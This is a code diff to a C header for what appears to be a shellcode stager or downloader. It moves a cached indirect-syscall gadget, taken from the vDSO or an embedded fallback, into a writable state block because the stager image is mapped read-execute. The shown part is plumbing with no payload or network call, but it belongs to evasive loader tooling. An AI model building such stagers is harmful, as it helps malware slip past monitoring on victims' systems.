@@ -1,6 +1,8 @@
 #ifndef SYSCALLS_H
 #define SYSCALLS_H
 
+#include "state.h"
+
 #define SYS_read 0
 #define SYS_write 1
 #define SYS_open 2
@@ -400,13 +402,15 @@ typedef struct {
 
 /*
  * Cache for the resolved gadget.
- * Defined in utils_min.c (single shared instance per binary).
- * MUST be initialized to a non-zero value to be placed in .data (not .bss).
- * Before init_indirect_syscalls() is called, this points to 0x1 (invalid).
- * After init, it points to either a vDSO gadget or the embedded fallback.
+ *
+ * Stored in the writable runtime state block (see state.h), not in .data: the
+ * stager image is mapped RX, so mutable globals must live in the state block
+ * bound to %r15 by downloader_main().
+ *
+ * Before init_indirect_syscalls() is called, syscall_gadget points to 0x1
+ * (invalid). After init, it points to either a vDSO gadget or the embedded
+ * fallback.
  */
-#define _SYSCALL_GADGET_UNRESOLVED ((void *)1)
-extern void *_cached_syscall_gadget __attribute__((visibility("hidden")));
 
 /* ---- Embedded fallback gadget (compiled into shellcode) ---- */
 static inline void *get_embedded_syscall_gadget(void) {
@@ -421,7 +425,9 @@ static inline void *get_embedded_syscall_gadget(void) {
 }
 
 /* ---- Hot path: trivial inline, zero overhead after init ---- */
-static inline void *get_syscall_gadget(void) { return _cached_syscall_gadget; }
+static inline void *get_syscall_gadget(void) {
+  return get_stager_state()->syscall_gadget;
+}
 
 /* ---- Initialization function (MUST be called before any syscall) ---- */
 void init_indirect_syscalls(void);
